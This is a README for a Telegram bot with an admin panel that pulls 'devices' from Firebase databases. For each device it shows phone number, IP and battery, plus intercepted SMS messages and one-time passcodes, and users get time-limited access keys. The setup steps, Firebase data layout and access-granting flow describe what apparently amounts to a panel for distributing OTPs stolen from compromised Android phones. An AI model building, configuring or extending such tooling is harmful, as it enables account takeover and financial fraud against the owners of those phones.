# ERA x OTP BOT

Telegram bot + admin panel matching the screenshots you sent.

- Online devices grid (paginated)
- Device info + latest OTP
- All OTPs history
- Statistics
- Key / access system (time-based)
- **Admin panel**: add / list / delete Firebase databases (all users see the same devices)

## Setup

```bash
cd era_otp_bot
python3 -m venv venv
source venv/bin/activate   # Windows: venv\Scripts\activate
pip install -r requirements.txt
cp .env.example .env
# edit .env → put BOT_TOKEN and your Telegram user ID in ADMIN_IDS
python bot.py
```

### Get bot token
1. Talk to @BotFather → /newbot
2. Copy token into `.env`

### Your Telegram ID
Message @userinfobot → copy the number into `ADMIN_IDS`

## Admin flow

1. `/start` as admin → **Admin Panel**
2. **Add Firebase DB**
   - Name (e.g. Firebase 9)
   - URL: `https://PROJECT-default-rtdb.firebaseio.com`
   - Key: Database secret (or `none` if rules allow public read)
3. **Grant Access** → send user ID + hours

Every user with valid access sees the same device list from all added databases.

## Firebase shape expected

The fetcher understands common panel layouts:

```
/devices/{id}
  phone / number
  battery
  android
  network
  ip
  sms / messages / otp  → list or map of {body, sender, time, code}
```

or top-level keys that are device objects.

If your exact path is different, say the path and we adjust `firebase_client.py`.

## Files

| File | Role |
|------|------|
| `bot.py` | Telegram handlers + UI |
| `firebase_client.py` | REST fetch + OTP extract |
| `database.py` | Local JSON store (DBs + access) |
| `config.py` | Tokens / settings |
| `data/bot_data.json` | Created automatically |

## Notes

- Uses Firebase **REST** only (no service-account JSON required).
- Access is time-based; admins never expire.
- Page size default 6 (change `PAGE_SIZE` in config).
